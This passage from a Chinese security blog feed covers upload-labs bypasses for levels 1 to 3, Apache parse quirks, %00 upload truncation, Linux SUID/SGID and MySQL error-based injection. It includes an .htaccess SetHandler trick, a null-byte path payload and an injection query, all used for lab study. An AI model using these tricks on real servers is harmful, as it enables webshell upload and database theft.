class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="审计："><a href="#审计：" class="headerlink" title="审计："></a><strong>审计：</strong></h5><p>刚开始是以php审计的后来发现有些函数不对劲啊，后来才发现是前端代码emmmmmmmmmm。<br>1.getElementsByName()<br>Web标准下可以通过getElementById(), getElementsByName(), and getElementsByTagName()访问Documnent中的任一个标签。<br>2.lastIndexOf()<br>indexOf 和 lastIndexOf 都是索引文件<br>indexOf 是查某个指定的字符串在字符串首次出现的位置（索引值） （也就是从前往后查）<br>lastIndexOf 是从右向左查某个指定的字符串在字符串中最后一次出现的位置（也就是从后往前查）,但是后者虽然从后往前查，计数的时候是从前往后开始计数即第一个数为1。所以使用这两个函数的时候返回值一样。<br>3.<code>if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1)</code><br>为什么要返回-1呢？<br>indexOf(String str): 返回指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。</p><h5 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a><strong>上传绕过</strong></h5><p>既然是前端检测，首先我们可以修改前端代码或者禁用js代码，然后我们可以burp抓包修改然后发包。<br><strong>1.修改代码,粘贴复制到控制台</strong><br>为啥要复制到控制台？(我一开始是查看源代码直接修改的肯定不好使）控制台是<br>程序员调试使用的。可以调试，查看源文件，跟踪链接，写js代码等。主要是在浏览器端的测试用。<br><img src="/images/43.png" alt="06e1eeb021fa7e11c977cf71a7069599.png"><br>查看文件：<br><img src="/images/45.jpg" alt><br>我在一开始查看上传文件的时候，提示url错误。无非两个原因第一个文件没有上传成功，第二就是路径错了。后来打开本地发现确实是路径错了。</p><p><strong>2.burp抓包修改。</strong><br>啰嗦一下原理。抓包修改就是说我们先将文件后缀修改为为它允许上传的后缀(但是内容不变)，然后<strong>绕过了前端的检测之后</strong>在burp中把后缀改成我们想要的后缀。<br>我们修改jpg为php，我们可以看到我们的文件内容是不被修改的。<br><img src="/images/44.png" alt="710cf050afbc1d6794b0442809179168.png"><br>上传成功。<br><img src="/images/45.png" alt="139c3800c1d333fae4cf28024cf9a7b0.png"><br><strong>3.禁用前端代码</strong><br>不提倡用这个，也很简单就是浏览器设置一下就ok。</p><h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a><strong>第二关</strong></h4><hr><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>))</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>1.$ _FILES<br>在这里讲一下这个变量，一直以为这是个用户自定义的变量。后来发现这是一个有点东西的数字变量：<br>$ _FILES数组内容如下:<br>$ _FILES[‘myFile’][‘name’] 客户端文件的原名称。<br>$ _FILES[‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。<br>$ _FILES[‘myFile’][‘size’] 已上传文件的大小，单位为字节。<br>$ _FILES[‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。</p><p>2.file_exists()<br>file_exists() 函数检查文件或目录是否存在。<br>3.move_uploaded_file()<br>move_uploaded_file() 函数将上传的文件移动到新位置。<br>move_uploaded_file(file,newloc)#(文件名字，文件位置)<br>综上，代码的意思就是先判断路径存不存在，然后在检测文件的content-tye，然后给予临时文件名，移动文件到新的目录。</p><h5 id="上传绕过："><a href="#上传绕过：" class="headerlink" title="上传绕过："></a><strong>上传绕过</strong>：</h5><p>1.burp抓包<br>既然是检测content-type肯定是要使用burp。第一次做没成功emmmmmm菜鸡啊。后来发现burp中有两个content-type<br>两者区别：<br>第一个为http请求中的content-type：<br> MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。这里就是指的是我们的请求网页的类别。从图中我们可以看到类型为：<br>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式。(与我们的上传网页很符合对吧)<br>第二个为我们上传的文件类型：<br>即php的对应类型，所以我们应该修改第二个content-type<br><img src="/images/46.png" alt="e3f60e6d0ac71e9b9e38af4e5e2be68d.png"></p><h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a><strong>第三关</strong></h4><hr><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>1.strrchr()<br>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。<br><strong>上传绕过：</strong><br>1.黑名单判断，服务器端禁止上传’.asp’,’.aspx’,’.php’,’.jsp’后缀的脚本文件。大写绕过也不行。<br><strong>在这里我们开个小外篇：</strong></p><hr><h4 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a><strong>文件解析漏洞</strong></h4><p>是指中间件（Apache、nginx、iis等）在解析文件时出现了漏洞，从而，黑客可以利用该漏洞实现非法文件的解析。文件解析漏洞与文件上传漏洞是两个不同的漏洞概念，文件解析漏洞是利用了中间件（Apache、nginx、iis等）配置不当的弱点进行攻击。<br><strong>PHP解析漏洞</strong><br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，一直到找到可识别后缀为止，然后将该可识别后缀进解析。Apache的文件解析过程是从右到左开始判断解析,如果为不可识别的后缀解析,就再往左判断。在Apache的解析中，除了“php|php3|phtml”等规定的后缀中，任何的后缀加入，都是不会被识别解析的，也会被跳过后缀处理。<br><strong>举栗子：jaky.php.k1.w2.a3<br>结果则会执行：jaky.php</strong><br>扩展知识：.htaccess文件.htaccess文件是运行Apache Web Server的Web服务器的配置文件，对配置和重定向Apache Web Server文件系统很有用。<br>如果Apache中.htaccess可被执行并可被上传，那么可以尝试在.htaccess中写入：<br>&lt;FilesMatch “jaky.jpg”&gt; SetHandler application/x-httpd-php <br>“jaky.jpg”文件中写的是木马文件，再把jaky.jpg”上传到受害者服务器中。此时“jaky.jpg”是会被当作“jaky.php”，就可以被攻击者所利用。<strong>在这里我们其实也可以上传phtml，php3，php4, php5, pht后缀名都可以绕过。但是为什么这些文件也能被解析？与php.ssp等等不同。</strong><br>在Apache的模块的配置文件中找到了php5.conf，配置文件中会有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.+.ph(p[345]?|t|tml)</span><br><span class="line"></span><br><span class="line"> .+\.phps$</span><br></pre></td></tr></table></figure><p>此类的正则表达式，文件名满足即可被当做php解析，也就是说php3，php4，php5，pht，phtml,phps都是可以被解析的。<br>我们在C:\phpStudy\PHPTutorial\Apache\conf文件中打开查看：<br><img src="/images/47.png" alt="7037991a8a85e64bac17466c0f59a062.png"><br>我们可以看到他定义了php和phtml，也可以加上正则表达式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php　　</span><br><span class="line">加入“AddType application/x-httpd-php .php”、　　</span><br><span class="line">&quot;AddType application/x-httpd-php .html&quot;两行，　</span><br><span class="line">你也可以加入更多，实质就是添加可以执行php的文件类型，比如你再加上一行　　</span><br><span class="line">&quot;AddType application/x-httpd-php .htm&quot;，则.htm文件也可以执行php程序了，你甚至还可以添加上一行　　</span><br><span class="line">&quot;AddType application/x-httpd-php .txt&quot;，让普通的文本文件格式也能运行php程序</span><br></pre></td></tr></table></figure><p>在Ubuntu上是利用 正则表达式的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php-source</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"># Deny access to files without filename (e.g. &apos;.php&apos;)</span><br><span class="line">&lt;FilesMatch &quot;^\.ph(p[345]?|t|tml|ps)$&quot;&gt;</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>如果apache开启了mod_rewrite模块，可以编辑.htaccess添加下面那段语句<br><code>AddType application/x-httpd-php .html .htm</code></p><hr><p>所以我们直接上传对应文件。但是我们在执行的时候发现返回url不存在，肯定是我们的文件名错了或者路径错了。打开本地查看文件名称：<br><img src="/images/48.png" alt="9f00ae634a41ae436532ef8643b8e4dc.png"><br>对应：<br><code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code><br>我们可以看到他被文件名字随机化了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天我们开始文件上传的学习。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>linux权限体系（三）特殊权限SUID、SGID</title>
    <link href="http://yoursite.com/2019/08/04/linux%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB%EF%BC%88%E4%B8%89%EF%BC%89%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90SUID%E3%80%81SGID/"/>
    <id>http://yoursite.com/2019/08/04/linux权限体系（三）特殊权限SUID、SGID/</id>
    <published>2019-08-04T07:50:26.000Z</published>
    <updated>2019-08-04T08:42:44.296Z</updated>
    
    <content type="html"><![CDATA[<p>一、SUID<br>1.1 基础知识<br>SUID 是针对二进制可执行文件而言的，他的最终目的是所有用户在执行设置了SUID的二进制可执行文件时，该二进制拥有的权限是文件所有者的权限。（打破安全上下文法则）。</p><a id="more"></a><p>案例理解:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@tysonscloud ~]# ls -l /bin/passwd </span><br><span class="line">-rwsr-xr-x. 1 root root 27832 Jun 10  2014 /bin/passwd</span><br><span class="line">[root@tysonscloud ~]# ls -l /etc/shadow</span><br><span class="line">---------- 1 root root 948 Jan 29 15:25 /etc/shadow</span><br></pre></td></tr></table></figure><p>用户用passwd命令修改密码是对/etc/shadow这个文件进行操作，然而普通用户对这个文件是没有任何权限的。按照从前的理论是没有办法对密码进行修改的。而SUID的作用就是使得普通用户在执行passwd这个程序后，产生的passwd进程的权限与该进程的所有者（root）而不是发起者（普通用户） 相同，这样普通用户就可以通过/etc/passwd这个程序进行密码修改了。</p><p>1.2 安全上下文法则</p><p>程序启动前：用户是否能够启动某二进制可执行文件为进程，取决于用户是否对该二进制可执行文件拥有x权限。<br>程序启动：进程拥有的权限为发起者的权限，也就是进程的属主是发起者的属主。<br>1.3 启用SUID后进程的属主<br>程序启动前：用户是否能够启动某二进制可执行文件为进程，取决于用户是否对该二进制可执行文件拥有x权限。<br>程序启动后：进程拥有的权限为二进制可执行文件属主的权限，也就是进程的属主是二进制文件的属主。<br>简言之，当我们启动某个二进制程序，该程序调用了其他非对象，此对象非启动者所有，也不具备相应权限时，此时无法成功执行。但是当我们为这个二进制程序赋予了SUID，则被调用的这个对象会被临时赋予该对象的所有者权限</p><p>下面直接演用鸟哥的示例来描述这个问题</p><p> ls -hltr /usr/bin/passwd /etc/shadow<br>-rwsr-xr-x. 1 root root 31K Feb 22 2012 /usr/bin/passwd ###权限为rws<br>———-. 1 root root 950 Aug 25 2016 /etc/shadow</p><p>密码文件/etc/shadow只有root用户拥有修改权限，那其他用户是如何修改自身密码的呢，那就是由于命令passwd拥有SUID权限<br>  a、vbird 对於 /usr/bin/passwd 这个程序来说是具有 x 权限的，表示 vbird 能运行 passwd；<br>  b、passwd 的拥有者是 root 这个帐号；<br>  c、vbird 运行 passwd 的过程中，会『暂时』获得 root 的权限；<br>  d、/etc/shadow 就可以被 vbird 所运行的 passwd 所修改。<br>但如果 vbird 使用 cat 去读取 /etc/shadow 时，他能够读取吗？因为 cat 不具有 SUID 的权限，所以 vbird 运行 『cat /etc/shadow』 时，是不能读取 /etc/shadow 的。 </p><p>1.4 案例2<br>在root用户环境下将二进制可执行文件/bin/cat复制到tyson用户的家目录对应文件夹下，可以看到此时是没有设置SUID的。（注意：SUID只会在属主的权限中显示）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@Tyson Lee learnSuid]# cp /bin/cat  /home/tyson/learnSuid/</span><br><span class="line">[root@Tyson Lee learnSuid]# ll</span><br><span class="line">total 56</span><br><span class="line">-rwxr-xr-x. 1 root root 54080 Jan 14 01:29 cat</span><br></pre></td></tr></table></figure><p>切换成tyson用户，测试在没有设置SUID权限的情况：<br>拥有cat文件执行权限的tyson用户启动cat进程后，进程拥有的权限是tyson用户的权限。<br>也就是说仅仅拥有tyson用户权限的cat程序无法对/etc/shadow文件进行操作（该文件的other权限为—）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@Tyson Lee learnSuid]# su - tyson</span><br><span class="line">Last login: Mon Jan 14 01:27:53 CST 2019 on pts/0</span><br><span class="line">[tyson@Tyson Lee ~]$ cd learnSuid/</span><br><span class="line">[tyson@Tyson Lee learnSuid]$ ls -al</span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x.  2 root  root     17 Jan 14 01:29 .</span><br><span class="line">drwx------. 10 tyson tyson  4096 Jan 14 01:29 ..</span><br><span class="line">-rwxr-xr-x.  1 root  root  54080 Jan 14 01:29 cat</span><br><span class="line">[tyson@Tyson Lee learnSuid]$ ~/learnSuid/cat /etc/shadow</span><br><span class="line">/home/tyson/learnSuid/cat: /etc/shadow: Permission denied</span><br><span class="line">[tyson@Tyson Lee ~]$ ls -l /etc/shadow</span><br><span class="line">----------. 1 root root 881 Jan 10 12:17 /etc/shadow</span><br></pre></td></tr></table></figure><p>二、SGID<br>2.1 基础知识<br>SGID的产生需求：root用户需要设置某一个文件夹，使得其他普通用户在该文件夹下创建文件的时候，所创建的文件的属组是目录的属组（而默认情况下文件的属组是创建者的属组）。<br>SGID可以作用在文件和目录上：<br>作用在文件上：类似于SUID，用户将二进制可执行文件启用成进程后，进程的属组是二进制可执行文件的属组，进程的权限是二进制可执行文件属组的权限。<br>作用在目录上：任何用户在该目录下创建的文件的属组与目录的属组相同。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一、SUID&lt;br&gt;1.1 基础知识&lt;br&gt;SUID 是针对二进制可执行文件而言的，他的最终目的是所有用户在执行设置了SUID的二进制可执行文件时，该二进制拥有的权限是文件所有者的权限。（打破安全上下文法则）。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux基础" scheme="http://yoursite.com/categories/Linux%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>关于上传中的00截断分析</title>
    <link href="http://yoursite.com/2019/08/03/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/08/03/关于上传中的00截断分析/</id>
    <published>2019-08-03T06:10:43.000Z</published>
    <updated>2019-08-03T07:45:24.360Z</updated>
    
    <content type="html"><![CDATA[<p>关于上传中00截断的细节，很多朋友在渗透中都会发现一些这样的有趣现象，这个站点使用00截断上传的方法上传成功了，而换一个站点又失败了，这是什么原因呢？你看了这篇文章就会明白。</p><a id="more"></a><p><img src="/images/35.png" alt></p><h4 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a><strong>00截断原理</strong></h4><hr><p>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p><h4 id="00截断的限制条件"><a href="#00截断的限制条件" class="headerlink" title="00截断的限制条件"></a><strong>00截断的限制条件</strong></h4><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP&lt;5.3.29，且GPC关闭</span><br></pre></td></tr></table></figure><h4 id="00截断的利用方法"><a href="#00截断的利用方法" class="headerlink" title="00截断的利用方法"></a><strong>00截断的利用方法</strong></h4><hr><h4 id="上传文件后缀检测代码"><a href="#上传文件后缀检测代码" class="headerlink" title="上传文件后缀检测代码"></a><strong>上传文件后缀检测代码</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_name = $_FILES[ &apos;file&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); // 提取上传文件后缀</span><br><span class="line">$target_name = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; // 对上传文件进行重命名</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ))</span><br><span class="line">&#123;    </span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],    $dir . $target_name); // 将临时文件移动到指定目录    </span><br><span class="line">    $result = $dir . $target_name;   </span><br><span class="line">    echo &quot;Stored in: $result&quot;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">    echo &quot;Invalid file&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>误区:</strong><br>有很多朋友喜欢在文件名中加%00进行截断，笔者认为这种方式是不对的，为什么呢？比如攻击者构造文件名：<code>admintony.php%00a.jpg</code>，在提取后缀名的时候遇到<code>%00</code>则认为字符串结束了，那么他提取到的后缀名会是.php，.php后缀又不允许上传所以上传失败了(这里有必要提一句，有人可能会说在一些情况下，<code>%00</code>截断文件名可以成功，这种案例你试一下是不是任意文件上传，西普的00截断实验就是一个任意文件上传的上传点，既然是任意文件上传又何必用00截断绕过呢？)<br><strong>正确用法:</strong><br>那么00截断应该在什么时候使用呢？笔者认为，数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在<code>path: uploads/</code>，那么攻击者可以通过修改path的值来构造<code>paylod: uploads/aa.php%00</code><br><img src="/images/36.png" alt><br>为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/2018051413370000.php，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。</p><h4 id="00和-00-urldecode"><a href="#00和-00-urldecode" class="headerlink" title="%00和%00(urldecode)"></a><strong>%00和%00(urldecode)</strong></h4><hr><p>在网上常见用Burp将数据包中的%00进行urldecode的操作，那为什么要进行这一个操作？网上也常见直接放入%00就可以截断成功的案例，为什么呢？<br><strong>%00(urldecode)</strong></p><p>首先解释为什么要进行urldecode操作呢？其原因在于上传的表单中有一个enctype的属性，并且需要<code>enctype=&quot;multipart/form-data&quot;</code>(不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。<br><img src="/images/37.png" alt><br><strong>%00</strong><br>那么为什么网上也有直接添加%00而不进行urldecode操作呢？因为path也可以存放在URL或者Cookie中，而在提交数据的时候，浏览器会对数据做一次urldecode的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在非<code>enctype=multipart/form-data</code>的表单中或URL or Cookie中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行URL解码即可。<br><img src="/images/38.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于上传中00截断的细节，很多朋友在渗透中都会发现一些这样的有趣现象，这个站点使用00截断上传的方法上传成功了，而换一个站点又失败了，这是什么原因呢？你看了这篇文章就会明白。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="上传漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>Mysql报错注入原理分析(count()、rand()、group by)</title>
    <link href="http://yoursite.com/2019/08/03/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-count-%E3%80%81rand-%E3%80%81group-by/"/>
    <id>http://yoursite.com/2019/08/03/Mysql报错注入原理分析-count-、rand-、group-by/</id>
    <published>2019-08-03T02:30:06.000Z</published>
    <updated>2019-08-18T12:47:34.949Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-疑问"><a href="#0x00-疑问" class="headerlink" title="0x00 疑问"></a><strong>0x00 疑问</strong></h3><hr><p>一直在用mysql数据库报错注入方法，但为何会报错？</p><a id="more"></a><p><img src="/images/6.png" alt><br>百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。</p><h4 id="0x01-位置问题？"><a href="#0x01-位置问题？" class="headerlink" title="0x01 位置问题？"></a><strong>0x01 位置问题？</strong></h4><p>select count(*),(floor(rand(0)2))x from information_schema.tables group by x; 这是网上最常见的语句,目前位置看到的网上sql注入教程,floor 都是直接放count() 后面，为了排除干扰，我们直接对比了两个报错语句，如下图<br><img src="/images/7.png" alt><br>由上面的图片，可以知道报错跟位置无关。</p><h4 id="0x02-绝对报错还是相对报错？"><a href="#0x02-绝对报错还是相对报错？" class="headerlink" title="0x02 绝对报错还是相对报错？"></a><strong>0x02 绝对报错还是相对报错？</strong></h4><p>是不是报错语句有了floor(rand(0)*2)以及其他几个条件就一定报错？其实并不是如此，我们先建建个表，新增一条记录看看，如下图：<br><img src="/images/8.png" alt><br><img src="/images/9.png" alt><br>确认表中只有一条记录后，再执行报错语句看看，如下图：<br><img src="/images/10.png" alt><br>多次执行均未发现报错。</p><p>然后我们新增一条记录。<br><img src="/images/11.png" alt><br>然后再测试下报错语句<br><img src="/images/12.png" alt><br>多次执行并没有报错</p><p>OK 那我们再增加一条<br><img src="/images/13.png" alt></p><p>执行报错语句<br><img src="/images/14.png" alt><br>ok 成功报错</p><p>由此可证明floor(rand(0)*2)报错是有条件的，记录必须3条以上，而且在3条以上必定报错，到底为何？请继续往下看。</p><h4 id="0x03-随机因子具有决定权么-rand-和rand-0"><a href="#0x03-随机因子具有决定权么-rand-和rand-0" class="headerlink" title="0x03 随机因子具有决定权么(rand()和rand(0))"></a><strong>0x03 随机因子具有决定权么(rand()和rand(0))</strong></h4><p>为了更彻底的说明报错原因，直接把随机因子去掉，再来一遍看看，先看一条记录的时候，如下图:<br><img src="/images/15.png" alt></p><p>一条记录的话 无论执行多少次也不报错</p><p>然后增加一条记录。</p><p>两条记录的话 结果就变成不确定性了<br><img src="/images/16.png" alt><br><img src="/images/17.png" alt><br><img src="/images/18.png" 